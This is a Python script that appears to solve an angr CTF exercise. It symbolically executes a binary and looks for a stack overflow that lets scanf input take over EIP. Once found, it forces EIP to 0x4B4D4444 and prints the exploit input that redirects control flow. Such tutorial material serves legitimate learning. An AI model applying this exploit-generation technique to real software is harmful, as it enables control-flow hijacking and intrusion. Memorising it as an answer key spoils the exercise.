import angr
import claripy
import sys

def main(argv):
  path_to_binary = argv[1]
  project = angr.Project(path_to_binary)

  initial_state = project.factory.entry_state()

  class ReplacementScanf(angr.SimProcedure):
    def run(self, format_string, scanf0_address):
      scanf0 = claripy.BVS('scanf0', 64 * 8)
      for char in scanf0.chop(bits=8):
        self.state.add_constraints(char >= 'A', char <= 'Z')

      self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)
      self.state.globals['solution'] = scanf0

  scanf_symbol = "__isoc99_scanf"
  project.hook_symbol(scanf_symbol, ReplacementScanf())

  def check_vulnerable(state):
    return state.solver.symbolic(state.regs.eip)

  simulation = project.factory.simgr(initial_state, 
                                     save_unconstrained=True, 
                                     stashes = {
                                       'active': [initial_state],
                                       'unconstrained': [],
                                       'found': [],
                                       'not_needed': []
                                     })

  def has_found_solution():
    return len(simulation.found) > 0

  def has_unconstrained_to_check():
    return len(simulation.unconstrained) > 0

  def has_active():
    return len(simulation.active) > 0

  while (has_active() or has_unconstrained_to_check()) and (not has_found_solution()):
    for unconstrained_state in simulation.unconstrained:
      if check_vulnerable(unconstrained_state):
        def should_move(s):
          return s is unconstrained_state
        simulation.move('unconstrained', 'found', filter_func=should_move)

      else: 
        simulation.move('unconstrained', 'not_needed')
 
    simulation.step()

  if simulation.found:
    solution_state = simulation.found[0]

    solution_state.add_constraints(solution_state.regs.eip == 0x4B4D4444)
    sln = solution_state.globals['solution']
    solution = solution_state.solver.eval(sln, cast_to=bytes)
    print(solution[::-1])
  else:
    raise Exception('Could not find the solution')

if __name__ == '__main__':
  main(sys.argv)
